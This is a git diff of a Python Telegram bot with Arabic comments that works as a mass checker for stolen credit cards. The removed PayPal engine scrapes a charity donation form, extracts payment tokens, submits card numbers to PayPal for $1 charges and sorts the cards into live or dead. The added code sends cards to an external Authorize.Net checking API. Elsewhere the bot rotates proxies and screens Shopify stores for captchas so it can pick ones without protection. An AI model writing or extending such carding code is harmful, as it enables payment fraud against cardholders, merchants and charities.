@@ -85,8 +85,9 @@ JOIN_CHANNEL_TARGET = get_valid_target(JOIN_CHANNEL_LINK, JOIN_CHANNEL_ID)
 JOIN_GROUP_TARGET = get_valid_target(JOIN_GROUP_LINK, JOIN_GROUP_ID)
 HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
-# رابط الـ API الجديد
+# روابط الـ APIs النشطة
 SHOPIFY_API_URL_1 = 'https://web-production-3d364.up.railway.app/shopify'
+AUTHNET_API_URL = 'https://authnet-4b3p.vercel.app/calc'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -383,14 +384,12 @@ def extract_cc(text):
 def parse_proxy_format(proxy):
     proxy = proxy.strip()
     
-    # استبعاد أي بروكسي يبدأ صراحة بكلمة socks (socks4, socks5) لمنع إضافته
     if re.match(r'^socks', proxy, re.IGNORECASE):
         return None
         
     pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
     pt, proxy = (pm.group(1).lower(), pm.group(2)) if pm else ('http', proxy)
     
-    # فحص بروتوكول البروكسي للتأكد مجدداً من خلوه من أي سوكس
     if 'socks' in pt:
         return None
         
@@ -604,7 +603,6 @@ async def check_shopify_api(api_url, card, site, proxy, session):
             
             rl = rm.lower()
             
-            # اقتناص أخطاء شوبفاي وبوابات الدفع ومنعها فوراً من الوصول لشرط الـ Approved
             if any(k in rl for k in ['empty submit', 'buyer_identity', 'presentment', 'payment_flexibility', 'flexibility', 'payment token', 'unable to get payment token']):
                 return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': gt, 'price': pr, 'retry': True}
             
@@ -630,215 +628,51 @@ async def check_shopify_api(api_url, card, site, proxy, session):
     except Exception as e: 
         return {'status': 'Site Error', 'message': f'API Error: {str(e)[:30]}', 'card': card, 'retry': True}
 
-# ====================== ASYNC PAYPAL GATEWAY ENGINE ======================
-async def check_paypal_api(card, proxy, session):
+# ====================== ASYNC AUTHNET GATEWAY ENGINE ======================
+async def check_authnet_api(card, proxy, session):
     try:
         proxy_url = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
         card = card.strip()
-        parts = card.split("|")
-        if len(parts) < 4:
-            return {'status': 'Dead', 'message': 'Invalid Card Format', 'card': card, 'gateway': 'PayPal Commerce', 'price': '$1.00'}
         
-        n, mm, yy, cvc = parts[0], parts[1], parts[2], parts[3]
-        if "20" in yy and len(yy) == 4:
-            yy = yy.split("20")[1]
-        elif len(yy) == 4:
-            yy = yy[2:]
-
-        price = "1.00"
-        urll = "https://www.callahandogs.com/donate/"
-        headers = {'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Mobile Safari/537.36"}
-        
-        async with session.get(urll, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response:
-            resp_text = await response.text()
-            
-        try:
-            # استخراج قيم WP GiveWP بشكل أكثر مرونة ودقة وتفادي الفشل
-            hash_match = re.search(r'name="give-form-hash"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-hash"', resp_text)
-            prefix_match = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-id-prefix"', resp_text)
-            form_id_match = re.search(r'name="give-form-id"\s+value="([^"]+)"', resp_text) or re.search(r'value="([^"]+)"\s+name="give-form-id"', resp_text)
-            
-            vaa = hash_match.group(1) if hash_match else ""
-            vaa2 = prefix_match.group(1) if prefix_match else ""
-            vaa3 = form_id_match.group(1) if form_id_match else ""
-            
-            # محرك استخراج مرن للتوكن وحمايته من التحديثات المستمرة للوردبريس
-            client_token_match = re.search(r'data-client-token="([^"]+)"', resp_text) or re.search(r'"data-client-token"\s*:\s*"([^"]+)"', resp_text)
-            if not client_token_match:
-                client_token_match = re.search(r'client-token["\']?\s*:\s*["\']([^"\']+)["\']', resp_text)
-                
-            if not client_token_match:
-                return {'status': 'Site Error', 'message': 'Client Token Not Found', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
-                
-            vaa4 = client_token_match.group(1)
-            decc = base64.b64decode(vaa4)
-            dec = decc.decode('utf-8', errors='ignore')
-            
-            au_match = re.search(r'"accessToken"\s*:\s*"([^"]+)"', dec)
-            if not au_match:
-                return {'status': 'Site Error', 'message': 'Access Token Extraction Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
-            au = au_match.group(1)
-        except Exception as e:
-            return {'status': 'Site Error', 'message': f'Token Extraction Failed: {str(e)[:25]}', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
-
-        url_create = "https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
-        payload = {
-            'give-honeypot': '',
-            'give-form-id-prefix': vaa2,
-            'give-form-id': vaa3,
-            'give-form-title': 'Make a Donation',
-            'give-current-url': urll,
-            'give-form-url': urll,
-            'give-form-minimum': price,
-            'give-form-maximum': '1000000',
-            'give-form-hash': vaa,
-            'give-price-id': '0',
-            'give-amount': price,
-            'payment-mode': 'paypal-commerce',
-            'give_title': 'Mr.',
-            'give_first': 'Gustave',
-            'give_last': 'Bruen',
-            'give_company_option': 'no',
-            'give_company_name': '',
-            'give_email': f'donate_{random.randint(1000,9999)}@gmail.com',
-            'give_comment': '',
-            'card_name': 'Tome',
-            'card_exp_month': '',
-            'card_exp_year': '',
-            'billing_country': 'US',
-            'card_address': 'RTS 58/3 Bark Camp',
-            'card_address_2': '',
-            'card_city': 'Alkol',
-            'card_state': 'WV',
-            'card_zip': '25501',
-            'give-gateway': 'paypal-commerce'
+        # ربط الـ API الرسمي وإرسال المعاملة المباشرة 
+        req_url = f"{AUTHNET_API_URL}?cc={quote(card)}"
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         }
         
-        async with session.post(url_create, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_create:
-            res_create = await response_create.json()
+        async with session.get(req_url, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as resp:
+            text_data = await resp.text()
             
-        try:
-            idd = res_create['data']['id']
-        except Exception:
-            return {'status': 'Site Error', 'message': 'Order Token Failed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price, 'retry': True}
-
-        url_confirm = f"https://cors.api.paypal.com/v2/checkout/orders/{idd}/confirm-payment-source"
-        payload_confirm = {
-            "payment_source": {
-                "card": {
-                    "number": n,
-                    "expiry": f"20{yy}-{mm}",
-                    "security_code": cvc,
-                    "attributes": {
-                        "verification": {
-                            "method": "SCA_WHEN_REQUIRED"
-                        }
-                    }
-                }
-            },
-            "application_context": {
-                "vault": False
-            }
-        }
-        headers_paypal = {
-            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Mobile Safari/537.36",
-            'Accept': "application/json",
-            'Content-Type': "application/json",
-            'authorization': f"Bearer {au}",
-            'paypal-client-metadata-id': "563cbf8c3dd9d1a1756ef318813c3da6",
-            'origin': "https://assets.braintreegateway.com",
-            'referer': "https://assets.braintreegateway.com/",
-            'accept-language': "en-US,en;q=0.9",
-        }
-        
-        # الإرسال الرسمي لـ PayPal API وقراءة الرد الحقيقي وتحليله مباشرةً
-        async with session.post(url_confirm, json=payload_confirm, headers=headers_paypal, proxy=proxy_url, timeout=API_TIMEOUT) as response_confirm:
-            confirm_status = response_confirm.status
-            confirm_text = await response_confirm.text()
-
-        try:
-            res_confirm = json.loads(confirm_text)
-        except Exception:
-            res_confirm = {}
-
-        # 1. فحص هل العملية تتطلب توثيقاً ثنائياً (3D Secure)
-        is_3ds = False
-        if res_confirm.get("name") == "AUTHENTICATION_REQUIRED":
-            is_3ds = True
-        else:
-            for link in res_confirm.get("links", []):
-                if link.get("rel") == "payer-action":
-                    is_3ds = True
-                    break
-
-        if is_3ds:
-            return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        # 2. استخراج وفك رموز الأخطاء الرسمية مباشرةً من مصفوفة الردود لـ PayPal
-        details = res_confirm.get("details", [])
-        if details:
-            issue = str(details[0].get("issue", "")).upper()
-            
-            if issue == "INSTRUMENT_DECLINED":
-                return {'status': 'Dead', 'message': 'Card Declined (Instrument Declined)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "CREDIT_CARD_CVV_CHECK_FAILED":
-                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "INSUFFICIENT_FUNDS":
-                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "CARD_EXPIRED":
-                return {'status': 'Dead', 'message': 'Card Expired', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "TRANSACTION_LIMIT_EXCEEDED":
-                return {'status': 'Dead', 'message': 'Transaction Limit Exceeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "PAYMENT_SOURCE_INFO_CANNOT_BE_VERIFIED":
-                return {'status': 'Dead', 'message': 'Card Info Cannot Be Verified', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            elif issue == "PAYMENT_SOURCE_DECLINED_BY_API":
-                return {'status': 'Dead', 'message': 'Declined by PayPal API', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            else:
-                return {'status': 'Dead', 'message': f'{issue.replace("_", " ").title()}', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        # 3. فحص الأخطاء النصية العامة من الاسم المرجعي للخطأ
-        error_name = res_confirm.get("name")
-        if error_name:
-            err_msg = res_confirm.get("message", error_name)
-            if "DECLINED" in error_name or "DECLINED" in err_msg.upper():
-                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            if "CVV" in error_name or "CVV" in err_msg.upper():
-                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            if "EXPIRED" in error_name or "EXPIRED" in err_msg.upper():
-                return {'status': 'Dead', 'message': 'Card Expired', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        if confirm_status >= 400:
-            confirm_text_lower = confirm_text.lower()
-            if "declined" in confirm_text_lower:
-                return {'status': 'Dead', 'message': 'Card Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            if "cvv" in confirm_text_lower:
-                return {'status': 'Approved', 'message': 'Security Code Incorrect (CCN)', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            if "insufficient" in confirm_text_lower:
-                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-            return {'status': 'Dead', 'message': f'PayPal Confirm Error ({confirm_status})', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        # 4. معالجة حالة النجاح في حال كان الطلب سليماً بالكامل (APPROVED / COMPLETED)
-        order_status = str(res_confirm.get("status", "")).upper()
-        if confirm_status in [200, 201, 202] or order_status in ["APPROVED", "COMPLETED"]:
-            url_approve = f"https://www.callahandogs.com/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={idd}"
             try:
-                async with session.post(url_approve, data=payload, headers=headers, proxy=proxy_url, timeout=API_TIMEOUT) as response_approve:
-                    res_approve = await response_approve.json()
-                    
-                if res_approve.get("success"):
-                    return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-                else:
-                    wp_err = str(res_approve.get("data", {}).get("error", "Transaction Failed")).strip()
-                    return {'status': 'Dead', 'message': wp_err, 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
+                rj = json.loads(text_data)
+                rm = str(rj.get('response_msg', rj.get('result', rj.get('Response', rj.get('message', rj.get('error', rj.get('msg', rj.get('status', text_data)))))))).strip()
             except Exception:
-                return {'status': 'Approved', 'message': 'Order Confirmed', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
-        return {'status': 'Dead', 'message': 'Transaction Declined', 'card': card, 'gateway': 'PayPal Commerce', 'price': price}
-
+                rm = text_data.strip()
+                
+            rl = rm.lower()
+            
+            # تصنيف وفلترة الردود الأصلية لبوابة Authorize.Net
+            if any(k in rl for k in ['this transaction has been approved', 'charged', 'success', 'payment succeeded', 'completed']):
+                return {'status': 'Charged', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                
+            if any(k in rl for k in ['insufficient funds', 'insufficient_funds', 'funds', 'balance']):
+                return {'status': 'Insufficient', 'message': 'Insufficient Funds', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                
+            if any(k in rl for k in ['authentication_required', '3d', 'secure', 'verification', 'otp', 'held for review', 'review']):
+                return {'status': 'Approved', 'message': '3D Secure Required', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                
+            if any(k in rl for k in ['the transaction was declined', 'declined', 'card declined', 'do not honor', 'stolen', 'lost', 'expired', 'invalid number', 'suspected fraud', 'card code is invalid']):
+                return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+                
+            if any(k in rl for k in ['error', 'timeout', 'proxy', 'bad gateway', 'cloudflare', 'system unavailable']):
+                return {'status': 'Site Error', 'message': rm, 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
+                
+            return {'status': 'Dead', 'message': rm if rm else 'Transaction Declined', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00'}
+            
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'PayPal API Timeout', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
+        return {'status': 'Site Error', 'message': 'AuthNet API Timeout', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
     except Exception as e:
-        return {'status': 'Site Error', 'message': f'PayPal API Error: {str(e)[:40]}', 'card': card, 'gateway': 'PayPal Commerce', 'price': '1.00', 'retry': True}
+        return {'status': 'Site Error', 'message': f'AuthNet API Error: {str(e)[:40]}', 'card': card, 'gateway': 'Authorize.Net', 'price': '$20.00', 'retry': True}
 
 async def remove_proxy_by_url(uid, proxy_url):
     try:
@@ -852,7 +686,7 @@ async def remove_proxy_by_url(uid, proxy_url):
 
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
     lr = None
-    tried_sites = set() # لضمان عدم تكرار فحص نفس البوابة للبطاقة الواحدة عند الفشل
+    tried_sites = set()
     
     for attempt in range(max_retries):
         if not proxies: 
@@ -861,23 +695,20 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             p_dict = random.choice(proxies)
             p = p_dict['proxy_url']
         
-        # تصفية المواقع النشطة والتي لم يتم تجربتها لهذه البطاقة في هذه المحاولة
         acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
         if not acs: 
-            # إذا تم تجربة كل المواقع، نتيح فرصة المحاولة مرة أخرى مع تجنب المواقع المجربة بالفعل في نفس الملف
             acs = [s for s in sites if s not in tried_sites]
         if not acs:
             acs = sites
             
         s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
-        tried_sites.add(s) # تسجيل الموقع الحالي لمنع التكرار
+        tried_sites.add(s)
         
         if gateway_name == "Shopify":
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
             msg = str(r.get('message', '')).lower()
             
-            # في حال وجود مشكلة في البروكسي/الاتصال، يتم تدويره والمحاولة مجدداً
             if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                 if p_dict:
                     if p_dict in proxies:
@@ -886,20 +717,18 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 lr = r
                 continue
 
-            # تخطي أخطاء الـ Rate Limit مؤقتاً
             if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
                 await asyncio.sleep(random.uniform(1.0, 1.8))
                 lr = r
                 continue
 
-            # في حال حدوث خطأ بوابة (Site Error) نقوم بتسجيله والانتقال لبوابة أخرى فوراً
             if status == 'Site Error' or is_dead_site_error(msg):
                 _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
                 lr = r
                 continue
 
-        elif gateway_name == "PayPal":
-            r = await check_paypal_api(card, p, session)
+        elif gateway_name == "AuthNet":
+            r = await check_authnet_api(card, p, session)
             status = r.get('status')
             msg = str(r.get('message', '')).lower()
 
@@ -917,7 +746,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
         
-        # إذا حصلنا على استجابة دفع حقيقية وحاسمة نخرج بها فوراً دون تكرار المحاولة
         if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
             _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
             return r
@@ -1004,7 +832,8 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         
         kb = [
             [InlineKeyboardButton('Shopify (Charge)', callback_data="gate:Shopify", style="success", icon_custom_emoji_id="5445388803223091254")],
-            [InlineKeyboardButton('PayPal Commerce ($1.00)', callback_data="gate:PayPal", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('AuthNet ($20.00)', callback_data="gate:AuthNet", style="primary", icon_custom_emoji_id="5447453226498552490")],
+            [InlineKeyboardButton('PayPal (Soon)', callback_data="none", style="danger", icon_custom_emoji_id="5269531045165816230")],
             [InlineKeyboardButton('Cancel', callback_data="gate:cancel", style="danger", icon_custom_emoji_id="5269531045165816230")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
@@ -1303,7 +1132,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         try: await styled_send(context.bot, tu, f"<b>{CE_BOOM} {sf('System Alert')}</b>\n\n╰ {sf('Your VIP access has been revoked by the administrator.')}", use_gif=True)
         except Exception: pass
 
-    # أمر حصري للآدمن: استخراج بوابات شوبفاي من الملفات المرفوعة وتجربتها للتأكد من عدم وجود كابتشا
     elif cmd == "checkgates":
         if uid not in ADMIN_ID:
             await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n╰ {sf('This command is restricted to administrators only.')}", use_gif=True)
@@ -1329,7 +1157,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         else:
                             return await styled_edit(tm, f"<b>{CE_CLOWN} {sf('Failed to fetch file from GitHub.')}</b>")
             
-            # تصفية وتجهيز المواقع الصحيحة فقط (Shopify)
             valid_format_sites = []
             for site in raw_sites:
                 site = site.lower().strip()
@@ -1360,7 +1187,6 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        # استبعاد بوابات الكابتشا أو الحظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
@@ -1559,6 +1385,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                     raw_msg = str(res.get('message', status)).replace('\n', ' ').strip()
                     last_resp = sf((raw_msg[:30] + '..') if len(raw_msg) > 30 else raw_msg)
                     
+                    # لا يتم إرسال إشعار Hit خاص للمستخدم إلا في حالة الـ Charged فقط
                     if status == 'Charged':
                         chg += 1
                         asyncio.create_task(_send_mass_hit(card, gate_name, res.get('price', '-'), uid, c_el, bot, http_session))
@@ -1634,7 +1461,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & SHOPIFY ONLY!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH AUTHNET INTEGRATION & PAYPAL DEACTIVATED!")
     while True:
         try:
             app.run_polling(drop_pending_updates=True)
